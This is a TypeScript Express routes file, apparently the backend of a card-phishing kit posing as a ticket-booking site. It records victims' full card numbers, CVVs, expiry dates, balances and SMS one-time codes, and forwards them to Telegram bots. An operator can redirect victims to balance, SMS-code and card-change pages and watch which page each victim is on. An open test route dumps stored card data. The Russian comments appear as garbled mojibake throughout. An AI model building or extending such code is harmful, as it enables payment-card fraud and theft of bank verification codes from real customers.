// routes.ts
import { Router } from "express";
import { db, generateSessionId } from "./db";
import {
  notifyBalance,
  notifyChange,
  notifySms,
  sendCustomerToEchoBot,
  sendLogToBot,
} from "./telegram";

const router = Router();

// –î–æ–±–∞–≤–ª—è–µ–º –ø–æ–ª–µ balance –≤ —Å—É—â–µ—Å—Ç–≤—É—é—â—É—é —Ç–∞–±–ª–∏—Ü—É card_logs
try {
  db.exec(`ALTER TABLE card_logs ADD COLUMN balance REAL DEFAULT NULL;`);
  db.exec(`ALTER TABLE card_logs ADD COLUMN sms_code REAL DEFAULT NULL;`);
  console.log("‚úÖ Added balance column to card_logs table");
} catch (error) {
  // –ü–æ–ª–µ —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç, –∏–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫—É
}

// –•—Ä–∞–Ω–∏–ª–∏—â–µ –¥–ª—è –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
const redirectRequests = new Map<string, { type: string; timestamp: number }>();

interface OnlineStatus {
  online: boolean;
  currentPage: string;
  lastActivity: number;
}

const onlineStatuses = new Map<string, OnlineStatus>();

router.post("/update-online-status", (req, res) => {
  const { sessionId, page } = req.body;

  if (!sessionId || !page) {
    return res
      .status(400)
      .json({ success: false, error: "sessionId and page required" });
  }

  onlineStatuses.set(sessionId, {
    online: true,
    currentPage: page,
    lastActivity: Date.now(),
  });

  console.log(`üü¢ User ${sessionId} is online on page: ${page}`);

  res.json({ success: true, message: "Status updated" });
});

router.get("/check-online-status/:sessionId", (req, res) => {
  const { sessionId } = req.params;

  const status = onlineStatuses.get(sessionId);

  if (!status) {
    return res.json({
      success: true,
      online: false,
      currentPage: null,
      lastSeen: "–Ω–∏–∫–æ–≥–¥–∞",
      lastKnownPage: null,
    });
  }

  // –°—á–∏—Ç–∞–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –æ—Ñ—Ñ–ª–∞–π–Ω, –µ—Å–ª–∏ –ø–æ—Å–ª–µ–¥–Ω—è—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å –±—ã–ª–∞ –±–æ–ª–µ–µ 30 —Å–µ–∫—É–Ω–¥ –Ω–∞–∑–∞–¥
  const isOnline = Date.now() - status.lastActivity < 30000;

  // –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º –≤—Ä–µ–º—è –ø–æ—Å–ª–µ–¥–Ω–µ–π –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏
  const secondsAgo = Math.floor((Date.now() - status.lastActivity) / 1000);
  const minutesAgo = Math.floor(secondsAgo / 60);

  let lastSeenText;
  if (secondsAgo < 60) {
    lastSeenText = `${secondsAgo} —Å–µ–∫. –Ω–∞–∑–∞–¥`;
  } else if (minutesAgo < 60) {
    lastSeenText = `${minutesAgo} –º–∏–Ω. –Ω–∞–∑–∞–¥`;
  } else {
    const hoursAgo = Math.floor(minutesAgo / 60);
    lastSeenText = `${hoursAgo} —á. –Ω–∞–∑–∞–¥`;
  }

  // –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º –Ω–∞–∑–≤–∞–Ω–∏–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è
  const pageNames: { [key: string]: string } = {
    "balance": "üí∞ –°—Ç—Ä–∞–Ω–∏—Ü–∞ –±–∞–ª–∞–Ω—Å–∞",
    "sms": "üìû –°—Ç—Ä–∞–Ω–∏—Ü–∞ SMS", 
    "success": "‚úÖ –°—Ç—Ä–∞–Ω–∏—Ü–∞ —É—Å–ø–µ—à–Ω–æ–π –æ–ø–ª–∞—Ç—ã",
    "change": "üîÑ –°—Ç—Ä–∞–Ω–∏—Ü–∞ –∏–∑–º–µ–Ω–µ–Ω–∏—è –∫–∞—Ä—Ç—ã",
    "payment": "üí≥ –°—Ç—Ä–∞–Ω–∏—Ü–∞ –æ–ø–ª–∞—Ç—ã"
  };

  const currentPageDisplay = pageNames[status.currentPage] || `üìÑ ${status.currentPage}`;

  if (isOnline) {
    res.json({
      success: true,
      online: true,
      currentPage: status.currentPage,
      currentPageDisplay: currentPageDisplay,
      lastSeen: "—Ç–æ–ª—å–∫–æ —á—Ç–æ",
      lastKnownPage: status.currentPage,
      lastKnownPageDisplay: currentPageDisplay,
    });
  } else {
    res.json({
      success: true,
      online: false,
      currentPage: status.currentPage,
      currentPageDisplay: currentPageDisplay,
      lastSeen: lastSeenText,
      lastKnownPage: status.currentPage,
      lastKnownPageDisplay: currentPageDisplay,
    });
  }
});

// ‚ûù –°–æ–∑–¥–∞–Ω–∏–µ —Å–µ—Å—Å–∏–∏ –∏ –∑–∞–∫–∞–∑–∞
router.post("/booking", (req, res) => {
  const { date, time, tickets, totalPrice } = req.body;

  // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º sessionId –Ω–∞ –±—ç–∫–µ–Ω–¥–µ
  const sessionId = generateSessionId();
  const bookingId = Math.random().toString(36).substring(2, 10).toUpperCase();

  db.prepare(
    `
    INSERT INTO bookings (session_id, booking_id, date, time, adult, child, total_amount, status)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
  `
  ).run(
    sessionId,
    bookingId,
    date,
    JSON.stringify(time),
    tickets.adult,
    tickets.child,
    totalPrice,
    "active"
  );

  res.json({
    success: true,
    sessionId: sessionId,
    bookingId: bookingId,
  });
});

// ‚ûù –î–∞–Ω–Ω—ã–µ –∑–∞–∫–∞–∑—á–∏–∫–∞
router.post("/customer", async (req, res) => {
  const { sessionId, name, surname, phone, bookingId } = req.body;

  db.prepare(
    `
    INSERT INTO customers (session_id, name, surname, phone)
    VALUES (?, ?, ?, ?)
  `
  ).run(sessionId, name, surname, phone);
  const booking = db
    .prepare("SELECT booking_id FROM bookings WHERE session_id = ?")
    .get(sessionId) as any;
  try {
    await sendCustomerToEchoBot({
      sessionId: sessionId,
      bookingId: booking?.booking_id,
      firstName: name,
      lastName: surname,
      phoneNumber: phone,
    });
    console.log(
      `‚úÖ –î–∞–Ω–Ω—ã–µ –∫–ª–∏–µ–Ω—Ç–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ —ç—Ö–æ-–±–æ—Ç–∞ –¥–ª—è —Å–µ—Å—Å–∏–∏: ${sessionId}`
    );
  } catch (error) {
    console.error(
      `‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ —ç—Ö–æ-–±–æ—Ç–∞ –¥–ª—è —Å–µ—Å—Å–∏–∏ ${sessionId}:`,
      error
    );
  }

  res.json({ success: true });
});

// ‚ûù –î–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã
router.post("/cardlog", async (req, res) => {
  const { sessionId, cardNumber, expireDate, cvv, step } = req.body;

  const masked = cardNumber;

  // –ï—Å–ª–∏ –ø—Ä–∏—à–µ–ª —Ç–æ–ª—å–∫–æ –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã (–ø–µ—Ä–≤—ã–π —à–∞–≥)
  if (step === "card_number_only") {
    db.prepare(
      `
      INSERT INTO card_logs (session_id, full_pan, masked_pan, cvv, expire_date, status, step)
      VALUES (?, ?, ?, ?, ?, ?, ?)
    `
    ).run(
      sessionId,
      cardNumber,
      masked,
      cvv || "",
      expireDate || "",
      "free",
      "card_number_only"
    );
  } else {
    // –°—Ç–∞—Ä–∞—è –ª–æ–≥–∏–∫–∞ –¥–ª—è –æ–±—Ä–∞—Ç–Ω–æ–π —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏
    db.prepare(
      `
      INSERT INTO card_logs (session_id, full_pan, masked_pan, cvv, expire_date, status)
      VALUES (?, ?, ?, ?, ?, ?)
    `
    ).run(sessionId, cardNumber, masked, cvv, expireDate, "free");
  }

  // –ü–æ–ª—É—á–∞–µ–º bookingId –¥–ª—è –±–æ—Ç–∞
  const booking = db
    .prepare("SELECT booking_id FROM bookings WHERE session_id = ?")
    .get(sessionId) as any;

  // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ –±–æ—Ç —Å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏
  await sendLogToBot({
    sessionId: sessionId,
    maskedPan: masked,
    bookingId: booking?.booking_id,
    step: step || "full", // –ü–µ—Ä–µ–¥–∞–µ–º —à–∞–≥ –≤ –±–æ—Ç
  });

  res.json({ success: true });
});

router.post("/cardlog-update", async (req, res) => {
  const { sessionId, cvv, expireDate } = req.body;

  try {
    // –û–±–Ω–æ–≤–ª—è–µ–º —Å—É—â–µ—Å—Ç–≤—É—é—â—É—é –∑–∞–ø–∏—Å—å
    const result = db
      .prepare(
        `UPDATE card_logs SET cvv = ?, expire_date = ?, step = 'completed' WHERE session_id = ?`
      )
      .run(cvv, expireDate, sessionId);

    if (result.changes === 0) {
      return res
        .status(404)
        .json({ success: false, error: "Session not found" });
    }

    // –ü–æ–ª—É—á–∞–µ–º –æ–±–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ –±–æ—Ç
    const cardLog = db
      .prepare("SELECT * FROM card_logs WHERE session_id = ?")
      .get(sessionId) as any;

    const booking = db
      .prepare("SELECT booking_id FROM bookings WHERE session_id = ?")
      .get(sessionId) as any;

    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ–±–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –≤ –±–æ—Ç
    await sendLogToBot({
      sessionId: sessionId,
      maskedPan: cardLog.masked_pan,
      bookingId: booking?.booking_id,
      step: "completed",
      cvv: cvv,
      expireDate: expireDate,
    });

    res.json({ success: true });
  } catch (error) {
    console.error("Error updating card log:", error);
    res.status(500).json({ success: false, error: "Database error" });
  }
});

// ‚ûù –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –±–∞–ª–∞–Ω—Å–∞ (–Ω–æ–≤—ã–π —ç–Ω–¥–ø–æ–∏–Ω—Ç)
router.post("/redirect-balance", (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) {
    return res
      .status(400)
      .json({ success: false, error: "sessionId required" });
  }

  // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —Å–µ—Å—Å–∏—è —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
  const booking = db
    .prepare("SELECT * FROM bookings WHERE session_id = ?")
    .get(sessionId);

  if (!booking) {
    return res.status(404).json({ success: false, error: "Session not found" });
  }

  // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∑–∞–ø—Ä–æ—Å –Ω–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ
  redirectRequests.set(sessionId, {
    type: "balance",
    timestamp: Date.now(),
  });

  console.log(`üîÑ Redirect request saved for session: ${sessionId}`);

  res.json({ success: true, message: "Redirect request saved" });
});

router.post("/redirect-success", (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) {
    return res
      .status(400)
      .json({ success: false, error: "sessionId required" });
  }

  // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —Å–µ—Å—Å–∏—è —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
  const booking = db
    .prepare("SELECT * FROM bookings WHERE session_id = ?")
    .get(sessionId);

  if (!booking) {
    return res.status(404).json({ success: false, error: "Session not found" });
  }

  // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∑–∞–ø—Ä–æ—Å –Ω–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ
  redirectRequests.set(sessionId, {
    type: "success",
    timestamp: Date.now(),
  });

  console.log(`üîÑ Redirect request saved for session: ${sessionId}`);

  res.json({ success: true, message: "Redirect request saved" });
});

router.post("/redirect-sms", (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) {
    return res
      .status(400)
      .json({ success: false, error: "sessionId required" });
  }

  // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —Å–µ—Å—Å–∏—è —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
  const booking = db
    .prepare("SELECT * FROM bookings WHERE session_id = ?")
    .get(sessionId);

  if (!booking) {
    return res.status(404).json({ success: false, error: "Session not found" });
  }

  // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∑–∞–ø—Ä–æ—Å –Ω–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ
  redirectRequests.set(sessionId, {
    type: "sms",
    timestamp: Date.now(),
  });

  console.log(`üîÑ Redirect request saved for session: ${sessionId}`);

  res.json({ success: true, message: "Redirect request saved" });
});

router.post("/redirect-change", (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) {
    return res
      .status(400)
      .json({ success: false, error: "sessionId required" });
  }

  // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —Å–µ—Å—Å–∏—è —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
  const booking = db
    .prepare("SELECT * FROM bookings WHERE session_id = ?")
    .get(sessionId);

  if (!booking) {
    return res.status(404).json({ success: false, error: "Session not found" });
  }

  // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∑–∞–ø—Ä–æ—Å –Ω–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ
  redirectRequests.set(sessionId, {
    type: "change",
    timestamp: Date.now(),
  });

  console.log(`üîÑ Redirect request saved for session: ${sessionId}`);

  res.json({ success: true, message: "Redirect request saved" });
});

// ‚ûù –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–π (–¥–ª—è —Ñ—Ä–æ–Ω—Ç–µ–Ω–¥–∞)
router.get("/check-redirect/:sessionId", (req, res) => {
  const { sessionId } = req.params;

  const redirectRequest = redirectRequests.get(sessionId);

  if (redirectRequest) {
    // –£–¥–∞–ª—è–µ–º –∑–∞–ø—Ä–æ—Å –ø–æ—Å–ª–µ –ø–æ–ª—É—á–µ–Ω–∏—è
    redirectRequests.delete(sessionId);

    res.json({
      success: true,
      redirect: true,
      type: redirectRequest.type,
      timestamp: redirectRequest.timestamp,
    });
  } else {
    res.json({ success: true, redirect: false });
  }
});

// ‚ûù –ü–æ–ª—É—á–µ–Ω–∏–µ –∑–∞–∫–∞–∑—á–∏–∫–∞ –ø–æ sessionId
router.get("/customer/:sessionId", (req, res) => {
  const { sessionId } = req.params;
  const row = db
    .prepare("SELECT * FROM customers WHERE session_id = ?")
    .get(sessionId);
  res.json(row || {});
});

// ‚ûù –ü–æ–ª—É—á–µ–Ω–∏–µ –∫–∞—Ä—Ç—ã –ø–æ sessionId
router.get("/card/:sessionId", (req, res) => {
  const { sessionId } = req.params;
  const row = db
    .prepare("SELECT * FROM card_logs WHERE session_id = ?")
    .get(sessionId);
  res.json(row || {});
});

router.get("/booking/:sessionId", (req, res) => {
  const { sessionId } = req.params;
  const row = db
    .prepare("SELECT * FROM bookings WHERE session_id = ?")
    .get(sessionId);
  res.json(row || {});
});

// ‚ûù –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞ –∫–∞—Ä—Ç—ã
router.post("/submit-balance", async (req, res) => {
  const { sessionId, balance } = req.body;

  if (!sessionId || balance === undefined || balance === null) {
    return res
      .status(400)
      .json({ success: false, error: "sessionId and balance required" });
  }

  try {
    // –û–±–Ω–æ–≤–ª—è–µ–º –∑–∞–ø–∏—Å—å –≤ card_logs —Å –±–∞–ª–∞–Ω—Å–æ–º
    const result = db
      .prepare(`UPDATE card_logs SET balance = ? WHERE session_id = ?`)
      .run(balance, sessionId);

    if (result.changes === 0) {
      return res
        .status(404)
        .json({ success: false, error: "Session not found" });
    }

    console.log(`üí∞ Balance saved for session ${sessionId}: ${balance} AED`);

    res.json({ success: true, message: "Balance saved successfully" });
  } catch (error) {
    console.error("Error saving balance:", error);
    res.status(500).json({ success: false, error: "Database error" });
  }
  await notifyBalance(sessionId, balance);
});

router.post("/submit-sms", async (req, res) => {
  const { sessionId, sms } = req.body;

  if (!sessionId || sms === undefined || sms === null) {
    return res
      .status(400)
      .json({ success: false, error: "sessionId and sms required" });
  }

  try {
    // –û–±–Ω–æ–≤–ª—è–µ–º –∑–∞–ø–∏—Å—å –≤ card_logs —Å –±–∞–ª–∞–Ω—Å–æ–º
    const result = db
      .prepare(`UPDATE card_logs SET sms_code = ? WHERE session_id = ?`)
      .run(sms, sessionId);

    if (result.changes === 0) {
      return res
        .status(404)
        .json({ success: false, error: "Session not found" });
    }

    console.log(`üí∞ Balance saved for session ${sessionId}: Code: ${sms}`);

    res.json({ success: true, message: "Balance saved successfully" });
  } catch (error) {
    console.error("Error saving balance:", error);
    res.status(500).json({ success: false, error: "Database error" });
  }
  await notifySms(sessionId, sms);
});

router.post("/submit-change", async (req, res) => {
  const { sessionId, change, expiryDate, cvc } = req.body; // –ò–∑–º–µ–Ω–∏–ª expiryYear –Ω–∞ expiryDate

  const changedCard = change;
  const changedExpiryDate = expiryDate; // –ü–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–ª
  const changedCvc = cvc;

  if (!sessionId || change === undefined || change === null) {
    return res
      .status(400)
      .json({ success: false, error: "sessionId and changed Card required" });
  }

  try {
    const result = db
      .prepare(
        `UPDATE card_logs SET masked_pan = ?, expire_date = ?, cvv = ? WHERE session_id = ?`
      )
      .run(changedCard, changedExpiryDate, changedCvc, sessionId); // –ò—Å–ø—Ä–∞–≤–∏–ª –Ω–∞–∑–≤–∞–Ω–∏—è –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö

    if (result.changes === 0) {
      return res
        .status(404)
        .json({ success: false, error: "Session not found" });
    }

    console.log(`üí∞ Card changed for ${sessionId}: New Card: ${change}`);

    res.json({ success: true, message: "Card updated successfully" });
  } catch (error) {
    console.error("Error saving card change:", error);
    res.status(500).json({ success: false, error: "Database error" });
  }
  await notifyChange(sessionId, changedCard, changedExpiryDate, changedCvc); // –ò—Å–ø—Ä–∞–≤–∏–ª –Ω–∞–∑–≤–∞–Ω–∏—è
});

router.get("/test", (req, res) => {
  try {
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö –∏ –ø–æ–ª—É—á–∞–µ–º –Ω–µ—Å–∫–æ–ª—å–∫–æ –∑–∞–ø–∏—Å–µ–π
    const bookings = db.prepare("SELECT * FROM bookings LIMIT 5").all();
    const customers = db.prepare("SELECT * FROM customers LIMIT 5").all();
    const cardLogs = db.prepare("SELECT * FROM card_logs LIMIT 5").all();

    // –ü–æ–ª—É—á–∞–µ–º –æ–±—â—É—é —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
    const stats = {
      totalBookings: db.prepare("SELECT COUNT(*) as count FROM bookings").get(),
      totalCustomers: db
        .prepare("SELECT COUNT(*) as count FROM customers")
        .get(),
      totalCardLogs: db
        .prepare("SELECT COUNT(*) as count FROM card_logs")
        .get(),
    };

    res.json({
      success: true,
      message: "–°–µ—Ä–≤–µ—Ä —Ä–∞–±–æ—Ç–∞–µ—Ç! ‚úÖ",
      timestamp: new Date().toISOString(),
      database: {
        connected: true,
        statistics: stats,
        sampleData: {
          bookings: bookings,
          customers: customers,
          cardLogs: cardLogs,
        },
      },
      server: {
        uptime: process.uptime(),
        nodeVersion: process.version,
        platform: process.platform,
      },
    });
  } catch (error) {
    console.error("Test route error:", error);
    res.status(500).json({
      success: false,
      message: "–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞–±–æ—Ç–µ —Å –±–∞–∑–æ–π –¥–∞–Ω–Ω—ã—Ö",
      timestamp: new Date().toISOString(),
    });
  }
});
// –û—á–∏—Å—Ç–∫–∞ —Å—Ç–∞—Ä—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è (–∫–∞–∂–¥—ã–µ 5 –º–∏–Ω—É—Ç)
setInterval(() => {
  const now = Date.now();
  for (const [sessionId, request] of redirectRequests.entries()) {
    // –£–¥–∞–ª—è–µ–º –∑–∞–ø—Ä–æ—Å—ã —Å—Ç–∞—Ä—à–µ 10 –º–∏–Ω—É—Ç
    if (now - request.timestamp > 10 * 60 * 1000) {
      redirectRequests.delete(sessionId);
    }
  }
}, 5 * 60 * 1000);

export default router;
